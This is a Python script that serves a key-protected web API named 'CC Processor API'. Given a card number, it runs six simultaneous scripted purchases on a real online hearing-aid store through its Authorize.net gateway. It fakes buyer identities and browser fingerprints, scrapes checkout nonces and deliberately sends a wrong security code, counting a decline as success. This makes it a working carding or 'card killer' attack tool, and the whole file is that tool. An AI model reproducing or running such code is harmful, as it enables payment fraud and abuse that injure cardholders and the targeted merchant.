import asyncio
import random
import os
import json
import time
try:
    import httpx
    from faker import Faker
    import urllib.parse
    import uvicorn
    from fastapi import FastAPI, HTTPException
    from fastapi.responses import JSONResponse
    from user_agent import generate_user_agent
except:
    os.system('pip install urllib3')
    os.system('pip install httpx')
    os.system('pip install faker')
    os.system('pip install uvicorn')
    os.system('pip install user_agent')
    os.system('pip install fastapi')
    import httpx
    from faker import Faker
    import urllib.parse
    import uvicorn    
    from fastapi import FastAPI, HTTPException
    from fastapi.responses import JSONResponse
    from user_agent import generate_user_agent

async def get_usa_address():
    fake = Faker('en_US')
    full_name = fake.name().split()
    first_name = full_name[0]
    last_name = " ".join(full_name[1:]) if len(full_name) > 1 else ""
    email_username = first_name.lower() + last_name.replace(" ", "").lower() + "027"
    email = f"{email_username}@gmail.com"
    address = {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": fake.street_address(),
        "city": fake.city(),
        "state": fake.state_abbr(),
        "zip": fake.zipcode(),
        "email": email
    }
    return address

def get_number(exclude):
    numbers = [i for i in range(100, 1000) if i != exclude]
    return str(random.choice(numbers))

async def kill(cc:str):
    num,mm,yy,cvc = cc.split("|")
    address = await get_usa_address()
    fn = address['first_name']
    ln = address['last_name']
    add = address['address_line1']
    email = address['email']
    city = urllib.parse.quote('New York')
    en_street = add.replace(' ','+')
    en_email = urllib.parse.quote(email)
    if not num.startswith('4'):
        return 'Only Visa Card Allowed'
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    user = generate_user_agent()
    user2 = urllib.parse.quote_plus(user)
    session_start_time = time.strftime(
    "%Y-%m-%d+%H%%3A%M%%3A%S",
    time.gmtime(time.time() - 120))
    headers1 = {'user-agent': user} 
    try:
        async with httpx.AsyncClient(timeout=30) as s:
            await s.get('https://meijer.lucidhearing.com/',  headers=headers1)
            headers = {
                'authority': 'meijer.lucidhearing.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://meijer.lucidhearing.com',
                'referer': 'https://meijer.lucidhearing.com/cart/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                'wc-ajax': 'add_to_cart',
            }
            
            data = {
                'success_message': '“Enrich Pro BTE” has been added to your cart',
                'product_sku': '10082',
                'product_id': '2679',
                'quantity': '1',
            }
            
            sc = await s.post('https://meijer.lucidhearing.com/', params=params, headers=headers, data=data)
            if sc.status_code==200:
                print("[ + ] Item Added to Cart")
            else:
                print("[ - ] Failed to Add Product")
                return {"status":"failure","reason":"Failed to Add Product"}
            headers = {
                'authority': 'meijer.lucidhearing.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'referer': 'https://meijer.lucidhearing.com/cart/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user,
            }
            
            chk = await s.get('https://meijer.lucidhearing.com/checkout/', headers=headers)
            if chk.status_code == 200:
                print("[ + ] Checkout Page Loaded")
            else:
                print("[ - ] Checkout Page Couldn't Be Loaded")
            text = chk.text
            uron = text.split('<script id="wc-checkout-js-extra">')[1].split('"update_order_review_nonce":"')[1].split('"')[0]
            cpn = text.split('<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
            if uron and cpn:
                print("[ + ] Checkout Page Fetched!")
                print("[ + ] Fetched Update Order Review Nonce and Checkout Processing Nonce")
                print(f"[ + ] Update Order Review Nonce : {uron}\n[ + ] Checkout Processing Nonce : {cpn}")
            else:
                print("[ - ] Update Order Review Nonce or Checkout Processing Nonce or Both not found")
                return {"status":"failure","reason":"Update Order Review Nonce or Checkout Processing Nonce or Both not found"}
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': 'https://meijer.lucidhearing.com',
                'Referer': 'https://meijer.lucidhearing.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user,
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
            }
            
            json_data = {
                'securePaymentContainerRequest': {
                    'merchantAuthentication': {
                        'name': '9uH8Ud9Yxc',
                        'clientKey': '7k7e3P45xz6XhnQ7M5fE72xY9ngCgkWdBQr6y6AXb95ZV83pwdU3XD9L4ftHPE3E',
                    },
                    'data': {
                        'type': 'TOKEN',
                        'id': '1406ade4-8fa0-2af2-b6b6-e69a9d897fda',
                        'token': {
                            'cardNumber': num,
                            'expirationDate': f'{mm}{yy1}',
                            'cardCode': str(get_number(int(cvc))),
                            'fullName': 'Ayush Ayushk',
                        },
                    },
                },
            }
            
            cardtoken = await s.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
            if cardtoken.status_code==200:
                print("[ + ] Card Tokenization Completed")
                cardtoken = cardtoken.text.split('"dataValue":"')[1].split('"')[0]
                if cardtoken:
                    print("[ + ] Card Token Extraction Successful")
                else:
                    print("[ - ] Card Token Extraction Failed !")
            else:
                print("[ - ] Card Tokenization Failed !")
            headers = {
                'authority': 'meijer.lucidhearing.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://meijer.lucidhearing.com',
                'referer': 'https://meijer.lucidhearing.com/checkout/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                'wc-ajax': 'checkout',
            }
            
            data = f'billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_address_1={en_street}&shipping_address_2=&shipping_country=US&shipping_postcode=10080&shipping_state=NY&shipping_city=New+York+City&shipping_phone=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fmeijer.lucidhearing.com%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fmeijer.lucidhearing.com%2Fcheckout%2F&wc_order_attribution_session_start_time={session_start_time}&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&shipping_method%5B0%5D=flexible_shipping_single%3A18&payment_method=authnet&ship_to_different_address=1&bill_to_different_address=same_as_shipping&billing_first_name={fn}&billing_last_name={ln}&billing_address_1={en_street}&billing_address_2=&billing_country=US&billing_postcode=10080&billing_state=NY&billing_city=New+York+City&billing_phone=&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review%26nocache%3D{str(time.time())}&authnet_nonce={cardtoken}&authnet_data_descriptor=COMMON.ACCEPT.INAPP.PAYMENT'
            
            status = await s.post('https://meijer.lucidhearing.com/', params=params, headers=headers, data=data)
            if status.status_code == 200:
                print("[ + ] CC Processing Started")
                if "declined" in status.text:
                    print("[ + ] CC Processed Successfully")
                    return {"status": "success"}
                else:
                    print("[ - ] CC Processing Failed !")
                    return {"status": "failure", "reason": f"Unknown Response from Site: {status.text}"}
            else:
                print("[ - ] CC Processing Failed !")
                return {"status": "failure", "reason": "Something Went Wrong At Last"}
    except Exception as Fuckoff:
        print(Fuckoff)
        return {"status": "failure", "reason": f"Exception: {str(Fuckoff)}"}

async def main(cc: str, required_success: int = 4, num_tasks: int = 6):
    tasks = [asyncio.create_task(kill(cc)) for _ in range(num_tasks)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = 0
    failure_reasons = []
    for result in results:
        if isinstance(result, Exception):
            failure_reasons.append(f"Exception: {str(result)}")
        elif isinstance(result, dict) and result.get("status") == "success":
            success_count += 1
        else:
            reason = result.get("reason", "Unknown reason") if isinstance(result, dict) else str(result)
            failure_reasons.append(reason)
    result_data = {
        "Status": "success" if success_count >= required_success else "failure",
        "force": success_count
    }
    if result_data["Status"] == "failure" and failure_reasons:
        unique_reasons = list(set(failure_reasons))
        if len(unique_reasons) == 1:
            result_data["reason"] = unique_reasons[0]
        else:
            result_data["reason"] = ", ".join([f"{i+1}.{reason}" for i, reason in enumerate(unique_reasons)])
    
    return result_data

app = FastAPI(title="CC Processor API", version="1.0")
VALID_KEY = "ayushanddark"

@app.get("/")
async def root():
    return {"message": "CC Processor API is running"}

@app.get("/gateway=killer/key={key}/cc={cc}")
async def process_cc(key: str, cc: str):
    if key != VALID_KEY:
        raise HTTPException(status_code=401, detail="Invalid authentication key")
    if not cc or "|" not in cc:
        raise HTTPException(status_code=400, detail="Invalid CC format. Use: num|mm|yy|cvc")
    
    try:
        result = await main(cc)
        return JSONResponse(content=result)    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Processing error: {str(e)}")

@app.get("/health")
async def health_check():
    return {"status": "healthy", "service": "CC Processor API"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)    